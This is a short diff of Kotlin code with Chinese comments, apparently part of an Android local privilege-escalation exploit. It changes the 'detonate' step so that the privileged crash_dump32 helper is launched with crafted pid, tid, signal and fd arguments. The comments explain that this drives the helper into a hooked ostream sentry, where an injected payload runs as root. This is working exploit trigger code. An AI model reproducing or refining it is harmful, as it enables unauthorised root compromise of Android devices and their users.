@@ -1033,7 +1033,14 @@ val payloadWrote = if (payload != null) hook.writeImage(payload, hookLanding, 16
                  *   ③ patch#1 只覆盖 crash_dump64，**不会碰它**
                  * 于是载荷将在特权域里起火，而不是像 crash_dump64 那样在 app 域里 139。
                  */
-                val proc = java.lang.Runtime.getRuntime().exec("/apex/com.android.runtime/bin/crash_dump32")
+                /*
+                 * 带"像样的原版参数"：空参数会让它立刻走错误分支退出（exit=0 已见），
+                 * 参数成形（pid/tid/signal/fd）才会进入真正的工作路径 —— 那条路会**打印**，
+                 * 也就必然走到被钩的 ostream sentry，于是载荷在 crash_dump 域（root）起火。
+                 */
+                val proc = java.lang.Runtime.getRuntime().exec(
+                    arrayOf("/apex/com.android.runtime/bin/crash_dump32", "1", "1", "11", "1"),
+                )
                 val exit = proc.waitFor()
                 step("typed: detonate exit=" + exit)
             }.onFailure { problem -> step("typed: detonate refused " + problem.javaClass.simpleName) }
